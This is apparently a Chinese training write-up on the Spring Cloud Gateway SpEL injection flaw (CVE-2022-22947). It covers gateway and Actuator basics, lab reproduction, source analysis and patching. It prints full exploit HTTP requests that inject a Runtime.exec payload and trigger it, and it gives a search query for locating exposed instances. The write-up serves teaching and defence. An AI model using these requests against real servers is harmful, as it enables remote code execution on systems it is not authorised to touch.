# 1、基本介绍

## 介绍内容

### 1）微服务架构与Spring Cloud

![image-20230420200051077](https://image.201068.xyz/assets/image-20230420200051077.png)

### 2）Spring Cloud生态

https://spring.io/projects/spring-cloud 

-  Eureka、Ribbon、OpenFeign、Hystrix、 Config、Zuul 
-  Consul、Gateway、Bus、Stream、Sleuth、 zipkin 
-  Nacos、Sentinel、Seata 

- ……

### 3）网关作用与解决方案

#### 网关作用

- 智能路由 
- 负载均衡 
- 协议转换 
- 权限校验 
- 限流熔断 
- 黑白名单 
- API监控 
- 日志审计

#### 网关解决方案

- Netflix Zuul 
- Spring Cloud Gateway 
- Kong 
- Nginx+Lua
- .....

### 4）Spring Cloud Gateway 

#### 使用

```
<dependency>
	<groupId>org.springframework.cloud</groupId>
	<artifactId>spring-cloud-starter-gateway</artifactId>
</dependency>

<dependency>
	<groupId>org.springframework.cloud</groupId>
	<artifactId>spring-cloud-gateway-server</artifactId>
	<version>3.1.0</version>
</dependency>
```

#### 概念

- 路由（Route） 
-  断言（Predicate） 
- 过滤器（Filter)

### 5）Spring Boot Actuator

- 健康检查 
- 审计 
- 统计 
- HTTP追踪 
- …… 

Prometheus

#### Actuator使用

```
<dependencies>
	<dependency>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-actuator</artifactId>
	</dependency>
</dependencies>
```



### 6）Gateway和Actuator集成

#### Gateway和Actuator

```
management.endpoint.gateway.enabled=true
management.endpoints.web.exposure.include=gateway
```

#### Actuator操作Gateway接口列表

```
http://host:port/actuator/gateway/id
```

| id            | HTTP Method | 描述               |
| ------------- | ----------- | ------------------ |
| globalfilters | GET         | 返回全局Filter列表 |
| routefilters  | GET         | 每个路由的filter   |
| routes        | GET         | 路由列表           |
| routes/{id}   | GET         | 指定路由的信息     |
| routes/{id}   | POST        | 创建路由           |
| refresh       | POST        | 刷新路由缓存       |
| routes/{id}   | DELETE      | 删除路由           |

```
http://192.168.70.13:9000/actuator/gateway/globalfilters

http://192.168.70.13:9000/actuator/gateway/routefilters

http://192.168.70.13:9000/actuator/gateway/routes
http://192.168.70.13:9000/actuator/gateway/routes/test
```



#### 添加路由 POST Body

```
{
  "id": "wuyaaq",
  "filters": [
    {
      "name": "AddResponseHeader",
      "args": {
        "name": "Result",
        "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[{\"whoami\"}).getInputStream()))}"
      }
    }
  ],
  "uri": "http://example.com"
}
```

# 2、漏洞复现

## 1、启动Spring Cloud Gateway服务*

1. 1、本地工程 
2. 2、vulhub - docker compose启动 
3. 3、vulfocus.io注册账号 
4. 4、马士兵教育（八方网域）自研靶场

## 2、添加过滤器（POST） 

```
POST /actuator/gateway/routes/hacktest HTTP/1.1
Host: 47.120.13.249:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 329

{
  "id": "wuyaaq",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}
```

## 3、刷新过滤器（POST）

```
POST /actuator/gateway/refresh HTTP/1.1
Host: 47.120.13.249:8080
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: keep-alive
Content-Length: 3
Content-Type: application/x-www-form-urlencoded
Origin: null
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0

a=1
```

## 4、访问过滤器ID（GET）

```
GET /actuator/gateway/routes/hack HTTP/1.1
Host: 47.120.13.249:8080
Proxy-Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
```

# 3、原理分析

## 问题

为什么添加过滤器（路由）会导致代码执行？

## 流程

1. 1、开启Acutator，可以通过接口列出路由（包括过 滤器），如：`/actuator/gateway/routes` 
2. 2、可以通过`/gateway/routes/{id_route_to_create}` 创建路由 
3. 3、通过`/actuator/gateway/refresh`刷新路由 
4. 4、当路由带有恶意的Filter，里面的spEL表达式会被执行

## payload分析

```
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}
```

## 源码

`ConfigurationService`类

![image-20230420202539716](https://image.201068.xyz/assets/image-20230420202539716.png)

## 源码

`ShortcutConfigurable`类

![image-20230420202609612](https://image.201068.xyz/assets/image-20230420202609612.png)

# 4、扫描与修复

## 影响范围

- Spring Cloud Gateway < 3.1.1 
- Spring Cloud Gateway < 3.0.7 

https://tanzu.vmware.com/security/cve-2022-22947

Pivotal

## zoomeye

```
app="vmware-SpringBoot-framework"
```

## 批量检测

`scan.py`

## 修复

### 1.更新升级 Spring Cloud Gateway 到以下安全版本： 

- Spring Cloud Gateway >=3.1.1 
- Spring Cloud Gateway >=3.0.7 

### 2.或在不考虑影响业务的情况下禁用 Actuator 接口 

```
management.endpoint.gateway.enable:false
```

